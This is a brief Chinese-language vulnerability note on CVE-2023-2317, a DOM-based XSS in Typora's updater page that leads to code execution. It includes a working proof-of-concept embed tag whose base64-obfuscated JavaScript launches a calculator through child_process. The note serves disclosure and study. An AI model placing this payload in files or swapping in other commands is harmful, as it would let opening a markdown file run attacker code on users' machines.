
# 基于Typora DOM的跨站点脚本导致远程代码执行（CVE-2023-2317）

## 漏洞简介

Windows和Linux版本1.6.7之前的Typora中updater/update.html中基于DOM的XSS允许特制的markdown文件通过加载在Typora主窗口的上下文中运行任意JavaScript代码`typora://app/typemark/updater/update.html`在＜embed＞标记中。如果用户在Typora中打开恶意降价文件，或者从恶意网页复制文本并将其粘贴到Typora，则可以利用此漏洞。

```html
<embed src="typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ'))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]"></embed>
```

## 漏洞复现
https://mp.weixin.qq.com/s/Jssc5eW7FVcyWPL9IVHr9g
